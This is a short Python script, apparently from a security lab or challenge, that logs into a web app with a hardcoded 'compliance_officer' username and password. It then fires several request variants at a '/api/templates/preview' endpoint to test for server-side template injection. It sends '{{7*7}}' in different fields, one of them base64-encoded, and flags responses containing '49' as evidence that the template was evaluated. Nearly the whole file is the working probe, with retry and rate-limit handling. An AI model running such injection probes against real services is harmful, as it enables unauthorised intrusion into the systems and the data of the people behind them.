import requests, time, base64, json

base = 'https://outofcontext-app.onrender.com'

def login():
    for a in range(8):
        s = requests.Session()
        s.post(base + '/login', data={'username': 'compliance_officer', 'password': 'AuditPolicy2026!'}, timeout=40)
        if s.cookies.get('session'):
            return s
        time.sleep(25)
    return None

s = login()

def call(body):
    for a in range(6):
        try:
            r = s.post(base + '/api/templates/preview', json=body, timeout=40, allow_redirects=False)
        except Exception:
            time.sleep(12); continue
        if r.status_code in (429, 502, 503):
            time.sleep(18); continue
        return r.status_code, r.text[:180]
    return 'TR', ''

b64 = base64.b64encode(b'{{7*7}}').decode()
variants = [
    {'template_id': 3, 'context': {'customer_name': '{{7*7}}'}},
    {'id': 3, 'context': {}},
    {'template': 3, 'context': {}},
    {'template_id': 3},
    {'context': {'x': '{{7*7}}'}},
    {'content_b64': b64},
    {'content': '{{7*7}}', 'context': {}},
    {},
]
for v in variants:
    sc, txt = call(v)
    print(json.dumps(v)[:60], '->', sc, ('<<49' if '49' in txt else ''), txt[:110])
    time.sleep(2)
